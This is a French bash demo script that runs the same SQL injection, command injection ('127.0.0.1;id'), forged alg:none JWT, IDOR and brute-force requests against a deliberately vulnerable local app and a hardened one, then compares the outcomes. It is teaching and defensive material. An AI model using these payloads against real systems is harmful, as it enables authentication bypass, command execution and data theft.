#!/usr/bin/env bash
# =============================================================================
# Démo COMPARATIVE attaque/défense : vuln_app (8002) vs secure_app (8001).
# Lance la MÊME attaque contre les deux et affiche les deux verdicts côte à côte.
#
#   chmod +x demo_comparatif.sh
#   ./demo_comparatif.sh
#   SECURE=http://IP:8001 VULN=http://IP:8002 ./demo_comparatif.sh
# =============================================================================
set -u

SECURE="${SECURE:-http://localhost:8001}"
VULN="${VULN:-http://localhost:8002}"
PW="Sup3r-S3cret!Pass"

if [ -z "${NO_COLOR:-}" ]; then
  G=$'\e[32m'; R=$'\e[31m'; Y=$'\e[33m'; C=$'\e[36m'; B=$'\e[1m'; Z=$'\e[0m'
else G=""; R=""; Y=""; C=""; B=""; Z=""; fi

command -v jq >/dev/null || { echo "Installe jq : sudo apt install -y jq"; exit 2; }

st() { # BASE PATH METHOD BODY TOKEN -> code HTTP
  local base="$1" path="$2" m="${3:-GET}" body="${4:-}" tok="${5:-}"
  local a=(-s -o /dev/null -w '%{http_code}' -X "$m" "$base$path")
  [ -n "$tok" ] && a+=(-H "Authorization: Bearer $tok")
  [ -n "$body" ] && a+=(-H 'Content-Type: application/json' -d "$body")
  curl "${a[@]}"
}
bd() { # BASE PATH METHOD BODY TOKEN -> corps
  local base="$1" path="$2" m="${3:-GET}" body="${4:-}" tok="${5:-}"
  local a=(-s -X "$m" "$base$path")
  [ -n "$tok" ] && a+=(-H "Authorization: Bearer $tok")
  [ -n "$body" ] && a+=(-H 'Content-Type: application/json' -d "$body")
  curl "${a[@]}"
}

row() { # LABEL  VULN_RESULT  SECURE_RESULT
  printf '%-34s | %sVULN%s %-22s | %sSÉCURISÉ%s %s\n' \
    "$1" "$R" "$Z" "$2" "$G" "$Z" "$3"
}

setup() { # BASE -> crée alice+bob, exporte TOK_A / TOK_B
  local base="$1"
  bd "$base" /auth/register POST "{\"username\":\"alice\",\"email\":\"a@x.com\",\"password\":\"$PW\"}" >/dev/null
  bd "$base" /auth/register POST "{\"username\":\"bob\",\"email\":\"b@x.com\",\"password\":\"$PW\"}"   >/dev/null
  TOK_A=$(bd "$base" /auth/login POST "{\"username\":\"alice\",\"password\":\"$PW\"}" | jq -r .access_token)
  TOK_B=$(bd "$base" /auth/login POST "{\"username\":\"bob\",\"password\":\"$PW\"}"   | jq -r .access_token)
}

echo "${C}${B}=== Comparatif attaque/défense — VULN $VULN  vs  SÉCURISÉ $SECURE ===${Z}"
echo

# Préparer les deux apps
setup "$VULN";   VA_TOK_A="$TOK_A"; VA_TOK_B="$TOK_B"
setup "$SECURE"; SA_TOK_A="$TOK_A"; SA_TOK_B="$TOK_B"

# --- J1 SQLi : bypass d'authentification -------------------------------------
echo "${Y}-- J1 Injection SQL ( ' OR '1'='1 ) --${Z}"
SQLI='{"username":"alice'"'"' OR '"'"'1'"'"'='"'"'1","password":"x"}'
row "Bypass login SQLi" "$(st "$VULN" /auth/login POST "$SQLI")  (200=bypass!)" "$(st "$SECURE" /auth/login POST "$SQLI")  (401=bloqué)"
echo

# --- J1 Command injection ----------------------------------------------------
echo "${Y}-- J1 Command injection ( 127.0.0.1;id ) --${Z}"
PING='{"host":"127.0.0.1;id"}'
row "ping ;id (code)" "$(st "$VULN" /tools/ping POST "$PING" "$VA_TOK_A")  (200=exécuté!)" "$(st "$SECURE" /tools/ping POST "$PING" "$SA_TOK_A")  (400=rejeté)"
echo "   ${R}preuve VULN -> sortie de la commande injectée :${Z}"
bd "$VULN" /tools/ping POST "$PING" "$VA_TOK_A" | jq -r '.output' 2>/dev/null | grep -i uid || echo "   (pas de binaire id côté hôte)"
echo

# --- J3 JWT alg:none ---------------------------------------------------------
echo "${Y}-- J3 JWT alg:none forgé --${Z}"
H=$(printf '%s' '{"alg":"none","typ":"JWT"}' | openssl base64 -A | tr '+/' '-_' | tr -d '=')
P=$(printf '%s' '{"sub":"x","type":"access"}' | openssl base64 -A | tr '+/' '-_' | tr -d '=')
FORGED="$H.$P."
row "Token alg:none -> /users/me" "$(st "$VULN" /users/me GET '' "$FORGED")  (200=accepté!)" "$(st "$SECURE" /users/me GET '' "$FORGED")  (401=rejeté)"
echo

# --- J3 Fuite du mot de passe ------------------------------------------------
echo "${Y}-- J3 /users/me : fuite de secret --${Z}"
VA_LEAK=$(bd "$VULN" /users/me GET '' "$VA_TOK_A" | jq -r 'has("password")')
SA_LEAK=$(bd "$SECURE" /users/me GET '' "$SA_TOK_A" | jq -r 'has("password") or has("password_hash")')
row "champ mot de passe renvoyé ?" "$VA_LEAK  (true=fuite!)" "$SA_LEAK  (false=ok)"
echo

# --- J4 BOLA / IDOR ----------------------------------------------------------
echo "${Y}-- J4 BOLA : bob lit la note d'alice --${Z}"
VA_NID=$(bd "$VULN" /notes POST '{"title":"secret","body":"prive alice"}' "$VA_TOK_A" | jq -r .id)
SA_NID=$(bd "$SECURE" /notes POST '{"title":"secret","body":"prive alice"}' "$SA_TOK_A" | jq -r .id)
row "bob lit note alice (code)" "$(st "$VULN" /notes/$VA_NID GET '' "$VA_TOK_B")  (200=fuite!)" "$(st "$SECURE" /notes/$SA_NID GET '' "$SA_TOK_B")  (404=bloqué)"
echo

# --- J4 Rate limiting (brute-force) ------------------------------------------
echo "${Y}-- J4 Brute-force login (7 essais) --${Z}"
vcodes=""; scodes=""
for i in $(seq 1 7); do
  vcodes="$vcodes $(st "$VULN"   /auth/login POST "{\"username\":\"alice\",\"password\":\"bad$i\"}")"
  scodes="$scodes $(st "$SECURE" /auth/login POST "{\"username\":\"alice\",\"password\":\"bad$i\"}")"
done
row "séquence des codes" "$vcodes  (jamais 429)" "$scodes  (429!)"
echo

# --- J4 En-têtes de sécurité -------------------------------------------------
echo "${Y}-- J4 En-têtes de sécurité (CSP) --${Z}"
vcsp=$(curl -s -D - -o /dev/null "$VULN/health"   | grep -ic 'content-security-policy')
scsp=$(curl -s -D - -o /dev/null "$SECURE/health" | grep -ic 'content-security-policy')
row "Content-Security-Policy présent" "$vcsp  (0=absent)" "$scsp  (1=présent)"
echo

echo "${C}${B}=== Fin du comparatif : la colonne VULN tombe, la colonne SÉCURISÉ tient ===${Z}"
